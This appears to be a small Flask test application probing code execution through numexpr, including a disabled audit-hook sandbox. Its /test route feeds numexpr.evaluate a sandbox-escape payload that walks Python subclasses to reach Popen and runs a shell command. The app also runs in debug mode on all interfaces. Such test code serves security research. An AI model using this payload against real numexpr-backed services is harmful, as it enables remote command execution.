from numexpr import cpuinfo
from flask import Flask, request
import os, sys
from mako.template import Template

def hook(evt, arg):
    if evt in ["sys._getframe", "object.__getattr__", "object.__setattr__"]:
        return
    frame = sys._getframe(0)
    f = frame.f_code.co_filename
    
    while frame:
        if frame.f_back is None:
            break
        else:
            frame = frame.f_back
        
        try:
            class_name = frame.f_locals['self'].__class__.__name__
        except KeyError:
            class_name = None
        
        func_name = frame.f_code.co_name
        if frame.f_code.co_filename == f:

            if class_name == None:
                if func_name == "index":
                    if evt not in ['open', 'builtins.id', 'compile', 'exec']:
                        raise RuntimeError('Event not allowed')
                    
            if class_name == None:
                if func_name == "test":
                    if evt not in ['open', 'builtins.id', 'compile', 'exec']:
                        raise RuntimeError('Event not allowed')

# sys.addaudithook(hook)

app = Flask(__name__)
successfull_status=(True,0)
global status
status=0

@app.route('/')
def index():
    cmd="ls"
    print(cpuinfo.getoutput(cmd,successfull_status)[1])
    t = Template("HEELO!")
    return t.render()

@app.route('/test')
def test():
    import numexpr
    s = """
(lambda fc=(
    lambda n: [
        c for c in 
            ().__class__.__bases__[0].__subclasses__() 
            if c.__name__ == n
        ][0]
    ):
    fc("function")(
        fc("Popen")("echo verybad",shell=True),{}
    )()
)()
"""
    numexpr.evaluate(s)
    t = Template("test")
    return t.render()

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0', port=5000)
